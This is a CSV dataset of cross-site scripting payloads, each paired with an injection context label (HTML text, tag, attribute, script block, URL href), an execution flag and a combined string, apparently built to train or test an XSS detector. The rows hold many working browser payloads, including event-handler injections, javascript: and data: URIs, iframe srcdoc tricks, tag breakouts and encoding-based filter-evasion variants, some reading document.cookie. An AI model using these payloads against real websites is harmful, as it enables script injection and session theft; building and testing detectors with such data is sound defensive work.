payload,context,exec,combined
""" onmouseleave=alert(1) """,script_block,0,"CONTEXT_script_block "" onmouseleave=alert(1) """
""" onmouseleave=alert(1) """,html_text,0,"CONTEXT_html_text "" onmouseleave=alert(1) """
""" onkeyup=alert(1) """,html_text,0,"CONTEXT_html_text "" onkeyup=alert(1) """
""" onkeyup=alert(1) """,html_tag,0,"CONTEXT_html_tag "" onkeyup=alert(1) """
""" onkeyup=alert(1) """,script_block,0,"CONTEXT_script_block "" onkeyup=alert(1) """
""" oninput=alert(1) """,html_tag,0,"CONTEXT_html_tag "" oninput=alert(1) """
""" oninput=alert(1) """,html_text,0,"CONTEXT_html_text "" oninput=alert(1) """
""" oninput=alert(1) """,script_block,0,"CONTEXT_script_block "" oninput=alert(1) """
;alert(document.domain);//,html_text,0,CONTEXT_html_text ;alert(document.domain);//
;alert(document.domain);//,html_attribute,0,CONTEXT_html_attribute ;alert(document.domain);//
;alert(document.domain);//,html_tag,0,CONTEXT_html_tag ;alert(document.domain);//
;alert(document.domain);//,url_href,0,CONTEXT_url_href ;alert(document.domain);//
""";confirm(1);//",html_text,0,"CONTEXT_html_text "";confirm(1);//"
""";confirm(1);//",html_tag,0,"CONTEXT_html_tag "";confirm(1);//"
""";confirm(1);//",html_attribute,0,"CONTEXT_html_attribute "";confirm(1);//"
""";confirm(1);//",url_href,0,"CONTEXT_url_href "";confirm(1);//"
""";prompt(1);//",html_text,0,"CONTEXT_html_text "";prompt(1);//"
""";prompt(1);//",html_attribute,0,"CONTEXT_html_attribute "";prompt(1);//"
""";prompt(1);//",html_tag,0,"CONTEXT_html_tag "";prompt(1);//"
""";prompt(1);//",url_href,0,"CONTEXT_url_href "";prompt(1);//"
""";alert(document.cookie);//",html_tag,0,"CONTEXT_html_tag "";alert(document.cookie);//"
""";alert(document.cookie);//",html_text,0,"CONTEXT_html_text "";alert(document.cookie);//"
""";alert(document.cookie);//",html_attribute,0,"CONTEXT_html_attribute "";alert(document.cookie);//"
""";alert(document.cookie);//",url_href,0,"CONTEXT_url_href "";alert(document.cookie);//"
""";alert(location);//",html_text,0,"CONTEXT_html_text "";alert(location);//"
""";alert(location);//",html_attribute,0,"CONTEXT_html_attribute "";alert(location);//"
""";alert(location);//",html_tag,0,"CONTEXT_html_tag "";alert(location);//"
""";alert(window.origin);//",html_text,0,"CONTEXT_html_text "";alert(window.origin);//"
""";alert(window.origin);//",html_tag,0,"CONTEXT_html_tag "";alert(window.origin);//"
""";alert(window.origin);//",html_attribute,0,"CONTEXT_html_attribute "";alert(window.origin);//"
</pre><marquee onstart=alert(1)>,html_tag,0,CONTEXT_html_tag </pre><marquee onstart=alert(1)>
</pre><marquee onstart=alert(1)>,html_text,0,CONTEXT_html_text </pre><marquee onstart=alert(1)>
</pre><marquee onstart=alert(1)>,html_attribute,0,CONTEXT_html_attribute </pre><marquee onstart=alert(1)>
</pre><marquee onstart=alert(1)>,script_block,0,CONTEXT_script_block </pre><marquee onstart=alert(1)>
;alert(navigator.userAgent);//,html_tag,0,CONTEXT_html_tag ;alert(navigator.userAgent);//
;alert(navigator.userAgent);//,html_attribute,0,CONTEXT_html_attribute ;alert(navigator.userAgent);//
;alert(navigator.userAgent);//,html_text,0,CONTEXT_html_text ;alert(navigator.userAgent);//
;alert(navigator.userAgent);//,url_href,0,CONTEXT_url_href ;alert(navigator.userAgent);//
;alert(document.title);//,html_text,0,CONTEXT_html_text ;alert(document.title);//
;alert(document.title);//,html_tag,0,CONTEXT_html_tag ;alert(document.title);//
;alert(document.title);//,html_attribute,0,CONTEXT_html_attribute ;alert(document.title);//
;alert(document.title);//,url_href,0,CONTEXT_url_href ;alert(document.title);//
;alert(history.length);//,html_text,0,CONTEXT_html_text ;alert(history.length);//
;alert(history.length);//,html_attribute,0,CONTEXT_html_attribute ;alert(history.length);//
;alert(history.length);//,html_tag,0,CONTEXT_html_tag ;alert(history.length);//
;alert(history.length);//,url_href,0,CONTEXT_url_href ;alert(history.length);//
"data:text/html,<script>alert(1)</script>",html_text,0,"CONTEXT_html_text data:text/html,<script>alert(1)</script>"
"data:text/html,<script>alert(1)</script>",html_attribute,0,"CONTEXT_html_attribute data:text/html,<script>alert(1)</script>"
"data:text/html,<script>alert(1)</script>",html_tag,0,"CONTEXT_html_tag data:text/html,<script>alert(1)</script>"
"data:text/html,<script>alert(1)</script>",script_block,0,"CONTEXT_script_block data:text/html,<script>alert(1)</script>"
"data:text/html,<script>alert(1)</script>",url_href,0,"CONTEXT_url_href data:text/html,<script>alert(1)</script>"
"data:text/html,<script>alert(document.domain)</script>",html_text,0,"CONTEXT_html_text data:text/html,<script>alert(document.domain)</script>"
"data:text/html,<script>alert(document.domain)</script>",html_attribute,0,"CONTEXT_html_attribute data:text/html,<script>alert(document.domain)</script>"
"data:text/html,<script>alert(document.domain)</script>",html_tag,0,"CONTEXT_html_tag data:text/html,<script>alert(document.domain)</script>"
"data:text/html,<script>alert(document.domain)</script>",url_href,0,"CONTEXT_url_href data:text/html,<script>alert(document.domain)</script>"
"data:text/html,<script>alert(document.domain)</script>",script_block,0,"CONTEXT_script_block data:text/html,<script>alert(document.domain)</script>"
"data:text/html,<img src=x onerror=alert(1)>",html_text,0,"CONTEXT_html_text data:text/html,<img src=x onerror=alert(1)>"
"data:text/html,<img src=x onerror=alert(1)>",html_attribute,0,"CONTEXT_html_attribute data:text/html,<img src=x onerror=alert(1)>"
"data:text/html,<img src=x onerror=alert(1)>",html_tag,0,"CONTEXT_html_tag data:text/html,<img src=x onerror=alert(1)>"
"data:text/html,<img src=x onerror=alert(1)>",script_block,0,"CONTEXT_script_block data:text/html,<img src=x onerror=alert(1)>"
"data:text/html,<img src=x onerror=alert(1)>",url_href,0,"CONTEXT_url_href data:text/html,<img src=x onerror=alert(1)>"
"data:text/html,<svg onload=alert(1)>",html_text,0,"CONTEXT_html_text data:text/html,<svg onload=alert(1)>"
"data:text/html,<svg onload=alert(1)>",html_tag,0,"CONTEXT_html_tag data:text/html,<svg onload=alert(1)>"
"data:text/html,<svg onload=alert(1)>",html_attribute,0,"CONTEXT_html_attribute data:text/html,<svg onload=alert(1)>"
"data:text/html,<svg onload=alert(1)>",script_block,0,"CONTEXT_script_block data:text/html,<svg onload=alert(1)>"
"data:text/html,<svg onload=alert(1)>",url_href,0,"CONTEXT_url_href data:text/html,<svg onload=alert(1)>"
"data:text/html,<script>confirm(1)</script>",html_text,0,"CONTEXT_html_text data:text/html,<script>confirm(1)</script>"
"data:text/html,<script>confirm(1)</script>",html_tag,0,"CONTEXT_html_tag data:text/html,<script>confirm(1)</script>"
"data:text/html,<script>confirm(1)</script>",html_attribute,0,"CONTEXT_html_attribute data:text/html,<script>confirm(1)</script>"
"data:text/html,<script>confirm(1)</script>",script_block,0,"CONTEXT_script_block data:text/html,<script>confirm(1)</script>"
"data:text/html,<script>confirm(1)</script>",url_href,0,"CONTEXT_url_href data:text/html,<script>confirm(1)</script>"
"data:text/html,<script>prompt(1)</script>",html_text,0,"CONTEXT_html_text data:text/html,<script>prompt(1)</script>"
"data:text/html,<script>prompt(1)</script>",html_tag,0,"CONTEXT_html_tag data:text/html,<script>prompt(1)</script>"
"data:text/html,<script>prompt(1)</script>",html_attribute,0,"CONTEXT_html_attribute data:text/html,<script>prompt(1)</script>"
"data:text/html,<script>prompt(1)</script>",script_block,0,"CONTEXT_script_block data:text/html,<script>prompt(1)</script>"
"data:text/html,<script>prompt(1)</script>",url_href,0,"CONTEXT_url_href data:text/html,<script>prompt(1)</script>"
"data:text/html,<script>alert(document.cookie)</script>",html_text,0,"CONTEXT_html_text data:text/html,<script>alert(document.cookie)</script>"
"data:text/html,<script>alert(document.cookie)</script>",html_attribute,0,"CONTEXT_html_attribute data:text/html,<script>alert(document.cookie)</script>"
"data:text/html,<script>alert(document.cookie)</script>",html_tag,0,"CONTEXT_html_tag data:text/html,<script>alert(document.cookie)</script>"
"data:text/html,<script>alert(document.cookie)</script>",script_block,0,"CONTEXT_script_block data:text/html,<script>alert(document.cookie)</script>"
"data:text/html,<script>alert(document.cookie)</script>",url_href,0,"CONTEXT_url_href data:text/html,<script>alert(document.cookie)</script>"
</pre><svg/onload=alert`1`>,html_text,0,CONTEXT_html_text </pre><svg/onload=alert`1`>
</pre><svg/onload=alert`1`>,html_attribute,0,CONTEXT_html_attribute </pre><svg/onload=alert`1`>
</pre><svg/onload=alert`1`>,script_block,0,CONTEXT_script_block </pre><svg/onload=alert`1`>
</pre><svg/onload=alert`1`>,url_href,0,CONTEXT_url_href </pre><svg/onload=alert`1`>
</pre><img src=x onerror=alert`1`>,html_text,0,CONTEXT_html_text </pre><img src=x onerror=alert`1`>
</pre><img src=x onerror=alert`1`>,html_attribute,0,CONTEXT_html_attribute </pre><img src=x onerror=alert`1`>
</pre><img src=x onerror=alert`1`>,script_block,0,CONTEXT_script_block </pre><img src=x onerror=alert`1`>
</pre><img src=x onerror=alert`1`>,url_href,0,CONTEXT_url_href </pre><img src=x onerror=alert`1`>
</pre><details open ontoggle=alert(1)>,html_text,0,CONTEXT_html_text </pre><details open ontoggle=alert(1)>
</pre><details open ontoggle=alert(1)>,html_attribute,0,CONTEXT_html_attribute </pre><details open ontoggle=alert(1)>
</pre><details open ontoggle=alert(1)>,script_block,0,CONTEXT_script_block </pre><details open ontoggle=alert(1)>
</pre><details open ontoggle=alert(1)>,url_href,0,CONTEXT_url_href </pre><details open ontoggle=alert(1)>
</pre><marquee onmouseover=alert(1)>hover me</marquee,html_text,0,CONTEXT_html_text </pre><marquee onmouseover=alert(1)>hover me</marquee
</pre><marquee onmouseover=alert(1)>hover me</marquee,html_attribute,0,CONTEXT_html_attribute </pre><marquee onmouseover=alert(1)>hover me</marquee
</pre><marquee onmouseover=alert(1)>hover me</marquee,script_block,0,CONTEXT_script_block </pre><marquee onmouseover=alert(1)>hover me</marquee
</pre><marquee onmouseover=alert(1)>hover me</marquee,url_href,0,CONTEXT_url_href </pre><marquee onmouseover=alert(1)>hover me</marquee
</pre><body onload=alert(1)>,html_text,0,CONTEXT_html_text </pre><body onload=alert(1)>
</pre><body onload=alert(1)>,html_attribute,0,CONTEXT_html_attribute </pre><body onload=alert(1)>
</pre><body onload=alert(1)>,script_block,0,CONTEXT_script_block </pre><body onload=alert(1)>
</pre><body onload=alert(1)>,url_href,0,CONTEXT_url_href </pre><body onload=alert(1)>
<IMG SRC=x ONERROR=alert(1)>,html_text,0,CONTEXT_html_text <IMG SRC=x ONERROR=alert(1)>
<IMG SRC=x ONERROR=alert(1)>,html_attribute,0,CONTEXT_html_attribute <IMG SRC=x ONERROR=alert(1)>
<IMG SRC=x ONERROR=alert(1)>,script_block,0,CONTEXT_script_block <IMG SRC=x ONERROR=alert(1)>
<IMG SRC=x ONERROR=alert(1)>,url_href,0,CONTEXT_url_href <IMG SRC=x ONERROR=alert(1)>
<svg OnLoAd=alert(1)>,html_text,0,CONTEXT_html_text <svg OnLoAd=alert(1)>
<svg OnLoAd=alert(1)>,html_attribute,0,CONTEXT_html_attribute <svg OnLoAd=alert(1)>
<svg OnLoAd=alert(1)>,script_block,0,CONTEXT_script_block <svg OnLoAd=alert(1)>
<svg OnLoAd=alert(1)>,url_href,0,CONTEXT_url_href <svg OnLoAd=alert(1)>
<svg/onload=alert(String.fromCharCode(49))>,html_text,0,CONTEXT_html_text <svg/onload=alert(String.fromCharCode(49))>
<svg/onload=alert(String.fromCharCode(49))>,html_attribute,0,CONTEXT_html_attribute <svg/onload=alert(String.fromCharCode(49))>
<svg/onload=alert(String.fromCharCode(49))>,script_block,0,CONTEXT_script_block <svg/onload=alert(String.fromCharCode(49))>
<svg/onload=alert(String.fromCharCode(49))>,url_href,0,CONTEXT_url_href <svg/onload=alert(String.fromCharCode(49))>
<img src=x onerror=alert&#40;1&#41;>,html_text,0,CONTEXT_html_text <img src=x onerror=alert&#40;1&#41;>
<img src=x onerror=alert&#40;1&#41;>,html_attribute,0,CONTEXT_html_attribute <img src=x onerror=alert&#40;1&#41;>
<img src=x onerror=alert&#40;1&#41;>,script_block,0,CONTEXT_script_block <img src=x onerror=alert&#40;1&#41;>
<img src=x onerror=alert&#40;1&#41;>,url_href,0,CONTEXT_url_href <img src=x onerror=alert&#40;1&#41;>
<img src=x onerror=alert&#x28;1&#x29;>,html_text,0,CONTEXT_html_text <img src=x onerror=alert&#x28;1&#x29;>
<img src=x onerror=alert&#x28;1&#x29;>,html_attribute,0,CONTEXT_html_attribute <img src=x onerror=alert&#x28;1&#x29;>
<img src=x onerror=alert&#x28;1&#x29;>,script_block,0,CONTEXT_script_block <img src=x onerror=alert&#x28;1&#x29;>
<img src=x onerror=alert&#x28;1&#x29;>,url_href,0,CONTEXT_url_href <img src=x onerror=alert&#x28;1&#x29;>
<svg/onload=alert(1)>,html_text,0,CONTEXT_html_text <svg/onload=alert(1)>
<svg/onload=alert(1)>,html_attribute,0,CONTEXT_html_attribute <svg/onload=alert(1)>
<svg/onload=alert(1)>,script_block,0,CONTEXT_script_block <svg/onload=alert(1)>
<svg/onload=alert(1)>,url_href,0,CONTEXT_url_href <svg/onload=alert(1)>
<svg/onload=alert`XSS`>,html_text,0,CONTEXT_html_text <svg/onload=alert`XSS`>
<svg/onload=alert`XSS`>,html_attribute,0,CONTEXT_html_attribute <svg/onload=alert`XSS`>
<svg/onload=alert`XSS`>,script_block,0,CONTEXT_script_block <svg/onload=alert`XSS`>
<svg/onload=alert`XSS`>,url_href,0,CONTEXT_url_href <svg/onload=alert`XSS`>
<img src=x onerror=alert(1)//>,html_text,0,CONTEXT_html_text <img src=x onerror=alert(1)//>
<img src=x onerror=alert(1)//>,html_attribute,0,CONTEXT_html_attribute <img src=x onerror=alert(1)//>
<img src=x onerror=alert(1)//>,script_block,0,CONTEXT_script_block <img src=x onerror=alert(1)//>
<img src=x onerror=alert(1)//>,url_href,0,CONTEXT_url_href <img src=x onerror=alert(1)//>
<img src=x onerror=alert(1)//,html_text,0,CONTEXT_html_text <img src=x onerror=alert(1)//
<img src=x onerror=alert(1)//,html_attribute,0,CONTEXT_html_attribute <img src=x onerror=alert(1)//
<img src=x onerror=alert(1)//,script_block,0,CONTEXT_script_block <img src=x onerror=alert(1)//
<img src=x onerror=alert(1)//,url_href,0,CONTEXT_url_href <img src=x onerror=alert(1)//
<svg/onload=confirm`1`>,html_text,0,CONTEXT_html_text <svg/onload=confirm`1`>
<svg/onload=confirm`1`>,html_attribute,0,CONTEXT_html_attribute <svg/onload=confirm`1`>
<svg/onload=confirm`1`>,script_block,0,CONTEXT_script_block <svg/onload=confirm`1`>
<svg/onload=confirm`1`>,url_href,0,CONTEXT_url_href <svg/onload=confirm`1`>
autofocus onfocus=alert(1) x=,html_text,0,CONTEXT_html_text autofocus onfocus=alert(1) x=
autofocus onfocus=alert(1) x=,html_attribute,0,CONTEXT_html_attribute autofocus onfocus=alert(1) x=
autofocus onfocus=alert(1) x=,script_block,0,CONTEXT_script_block autofocus onfocus=alert(1) x=
autofocus onfocus=alert(1) x=,url_href,0,CONTEXT_url_href autofocus onfocus=alert(1) x=
onpointerover=alert(1),html_text,0,CONTEXT_html_text onpointerover=alert(1)
onpointerover=alert(1),html_attribute,0,CONTEXT_html_attribute onpointerover=alert(1)
onpointerover=alert(1),url_href,0,CONTEXT_url_href onpointerover=alert(1)
onpointerover=alert(1),script_block,0,CONTEXT_script_block onpointerover=alert(1)
<meter onmouseover=alert(1)>,html_text,0,CONTEXT_html_text <meter onmouseover=alert(1)>
<meter onmouseover=alert(1)>,html_attribute,0,CONTEXT_html_attribute <meter onmouseover=alert(1)>
<meter onmouseover=alert(1)>,script_block,0,CONTEXT_script_block <meter onmouseover=alert(1)>
<meter onmouseover=alert(1)>,url_href,0,CONTEXT_url_href <meter onmouseover=alert(1)>
"<iframe srcdoc=""<script>alert(1)</script>"">",html_text,0,"CONTEXT_html_text <iframe srcdoc=""<script>alert(1)</script>"">"
"<iframe srcdoc=""<script>alert(1)</script>"">",html_attribute,0,"CONTEXT_html_attribute <iframe srcdoc=""<script>alert(1)</script>"">"
"<iframe srcdoc=""<script>alert(1)</script>"">",script_block,0,"CONTEXT_script_block <iframe srcdoc=""<script>alert(1)</script>"">"
"<iframe srcdoc=""<script>alert(1)</script>"">",url_href,0,"CONTEXT_url_href <iframe srcdoc=""<script>alert(1)</script>"">"
<iframe src=javascript:alert(1)>,html_text,0,CONTEXT_html_text <iframe src=javascript:alert(1)>
<iframe src=javascript:alert(1)>,html_attribute,0,CONTEXT_html_attribute <iframe src=javascript:alert(1)>
<iframe src=javascript:alert(1)>,script_block,0,CONTEXT_script_block <iframe src=javascript:alert(1)>
<iframe src=javascript:alert(1)>,url_href,0,CONTEXT_url_href <iframe src=javascript:alert(1)>
"<iframe src=""data:text/html,<script>alert(1)</script>"">",html_text,0,"CONTEXT_html_text <iframe src=""data:text/html,<script>alert(1)</script>"">"
"<iframe src=""data:text/html,<script>alert(1)</script>"">",html_attribute,0,"CONTEXT_html_attribute <iframe src=""data:text/html,<script>alert(1)</script>"">"
"<iframe src=""data:text/html,<script>alert(1)</script>"">",script_block,0,"CONTEXT_script_block <iframe src=""data:text/html,<script>alert(1)</script>"">"
"<iframe src=""data:text/html,<script>alert(1)</script>"">",url_href,0,"CONTEXT_url_href <iframe src=""data:text/html,<script>alert(1)</script>"">"
"<iframe srcdoc=""<img src=x onerror=alert(1)>"">",html_text,0,"CONTEXT_html_text <iframe srcdoc=""<img src=x onerror=alert(1)>"">"
"<iframe srcdoc=""<img src=x onerror=alert(1)>"">",html_attribute,0,"CONTEXT_html_attribute <iframe srcdoc=""<img src=x onerror=alert(1)>"">"
"<iframe srcdoc=""<img src=x onerror=alert(1)>"">",script_block,0,"CONTEXT_script_block <iframe srcdoc=""<img src=x onerror=alert(1)>"">"
"<iframe srcdoc=""<img src=x onerror=alert(1)>"">",url_href,0,"CONTEXT_url_href <iframe srcdoc=""<img src=x onerror=alert(1)>"">"
"<iframe srcdoc=""<svg onload=alert(1)>"">",html_text,0,"CONTEXT_html_text <iframe srcdoc=""<svg onload=alert(1)>"">"
"<iframe srcdoc=""<svg onload=alert(1)>"">",html_attribute,0,"CONTEXT_html_attribute <iframe srcdoc=""<svg onload=alert(1)>"">"
"<iframe srcdoc=""<svg onload=alert(1)>"">",script_block,0,"CONTEXT_script_block <iframe srcdoc=""<svg onload=alert(1)>"">"
"<iframe srcdoc=""<svg onload=alert(1)>"">",url_href,0,"CONTEXT_url_href <iframe srcdoc=""<svg onload=alert(1)>"">"
><svg/onload=alert(1)>,html_text,0,CONTEXT_html_text ><svg/onload=alert(1)>
><svg/onload=alert(1)>,script_block,0,CONTEXT_script_block ><svg/onload=alert(1)>
><svg/onload=alert(1)>,url_href,0,CONTEXT_url_href ><svg/onload=alert(1)>
><img src=x onerror=alert(1)>,html_text,0,CONTEXT_html_text ><img src=x onerror=alert(1)>
><img src=x onerror=alert(1)>,script_block,0,CONTEXT_script_block ><img src=x onerror=alert(1)>
><img src=x onerror=alert(1)>,url_href,0,CONTEXT_url_href ><img src=x onerror=alert(1)>
</script><svg/onload=alert(1)>,html_text,0,CONTEXT_html_text </script><svg/onload=alert(1)>
</script><svg/onload=alert(1)>,html_attribute,0,CONTEXT_html_attribute </script><svg/onload=alert(1)>
</script><svg/onload=alert(1)>,url_href,0,CONTEXT_url_href </script><svg/onload=alert(1)>
</title><svg/onload=alert(1)>,html_text,0,CONTEXT_html_text </title><svg/onload=alert(1)>
</title><svg/onload=alert(1)>,html_attribute,0,CONTEXT_html_attribute </title><svg/onload=alert(1)>
</title><svg/onload=alert(1)>,script_block,0,CONTEXT_script_block </title><svg/onload=alert(1)>
</title><svg/onload=alert(1)>,url_href,0,CONTEXT_url_href </title><svg/onload=alert(1)>
</textarea><svg/onload=alert(1)>,html_text,0,CONTEXT_html_text </textarea><svg/onload=alert(1)>
</textarea><svg/onload=alert(1)>,html_attribute,0,CONTEXT_html_attribute </textarea><svg/onload=alert(1)>
</textarea><svg/onload=alert(1)>,script_block,0,CONTEXT_script_block </textarea><svg/onload=alert(1)>
</textarea><svg/onload=alert(1)>,url_href,0,CONTEXT_url_href </textarea><svg/onload=alert(1)>
javascript:alert`1`,html_text,0,CONTEXT_html_text javascript:alert`1`
javascript:alert`1`,html_attribute,0,CONTEXT_html_attribute javascript:alert`1`
javascript:alert`1`,html_tag,0,CONTEXT_html_tag javascript:alert`1`
javascript:alert`1`,script_block,0,CONTEXT_script_block javascript:alert`1`
javascript:alert(String.fromCharCode(49)),html_text,0,CONTEXT_html_text javascript:alert(String.fromCharCode(49))
javascript:alert(String.fromCharCode(49)),html_tag,0,CONTEXT_html_tag javascript:alert(String.fromCharCode(49))
javascript:alert(String.fromCharCode(49)),html_attribute,0,CONTEXT_html_attribute javascript:alert(String.fromCharCode(49))
javascript:alert(String.fromCharCode(49)),script_block,0,CONTEXT_script_block javascript:alert(String.fromCharCode(49))
javascript:confirm`1`,html_text,0,CONTEXT_html_text javascript:confirm`1`
javascript:confirm`1`,html_tag,0,CONTEXT_html_tag javascript:confirm`1`
javascript:confirm`1`,html_attribute,0,CONTEXT_html_attribute javascript:confirm`1`
javascript:confirm`1`,script_block,0,CONTEXT_script_block javascript:confirm`1`
javascript:prompt`1`,html_text,0,CONTEXT_html_text javascript:prompt`1`
javascript:prompt`1`,html_attribute,0,CONTEXT_html_attribute javascript:prompt`1`
javascript:prompt`1`,html_tag,0,CONTEXT_html_tag javascript:prompt`1`
javascript:prompt`1`,script_block,0,CONTEXT_script_block javascript:prompt`1`
"data:text/html,<svg/onload=alert(1)>",html_text,0,"CONTEXT_html_text data:text/html,<svg/onload=alert(1)>"
"data:text/html,<svg/onload=alert(1)>",html_attribute,0,"CONTEXT_html_attribute data:text/html,<svg/onload=alert(1)>"
"data:text/html,<svg/onload=alert(1)>",html_tag,0,"CONTEXT_html_tag data:text/html,<svg/onload=alert(1)>"
"data:text/html,<svg/onload=alert(1)>",script_block,0,"CONTEXT_script_block data:text/html,<svg/onload=alert(1)>"
"data:text/html,<svg/onload=alert(1)>",url_href,0,"CONTEXT_url_href data:text/html,<svg/onload=alert(1)>"
onblur=alert(1),html_text,0,CONTEXT_html_text onblur=alert(1)
onblur=alert(1),html_tag,0,CONTEXT_html_tag onblur=alert(1)
onblur=alert(1),script_block,0,CONTEXT_script_block onblur=alert(1)
onblur=alert(1),url_href,0,CONTEXT_url_href onblur=alert(1)
""" onfocus=alert(1) autofocus """,html_text,0,"CONTEXT_html_text "" onfocus=alert(1) autofocus """
""" onfocus=alert(1) autofocus """,html_tag,0,"CONTEXT_html_tag "" onfocus=alert(1) autofocus """
""" onfocus=alert(1) autofocus """,script_block,0,"CONTEXT_script_block "" onfocus=alert(1) autofocus """
""" onfocus=alert(1) autofocus """,url_href,0,"CONTEXT_url_href "" onfocus=alert(1) autofocus """
<source onerror=alert(1)>,html_text,0,CONTEXT_html_text <source onerror=alert(1)>
<source onerror=alert(1)>,script_block,0,CONTEXT_script_block <source onerror=alert(1)>
<source onerror=alert(1)>,html_attribute,0,CONTEXT_html_attribute <source onerror=alert(1)>
<source onerror=alert(1)>,url_href,0,CONTEXT_url_href <source onerror=alert(1)>
javascript:prompt(1),html_text,0,CONTEXT_html_text javascript:prompt(1)
javascript:prompt(1),html_tag,0,CONTEXT_html_tag javascript:prompt(1)
javascript:prompt(1),html_attribute,0,CONTEXT_html_attribute javascript:prompt(1)
javascript:prompt(1),script_block,0,CONTEXT_script_block javascript:prompt(1)
javascript:confirm(1),html_text,0,CONTEXT_html_text javascript:confirm(1)
javascript:confirm(1),html_tag,0,CONTEXT_html_tag javascript:confirm(1)
javascript:confirm(1),html_attribute,0,CONTEXT_html_attribute javascript:confirm(1)
javascript:confirm(1),script_block,0,CONTEXT_script_block javascript:confirm(1)
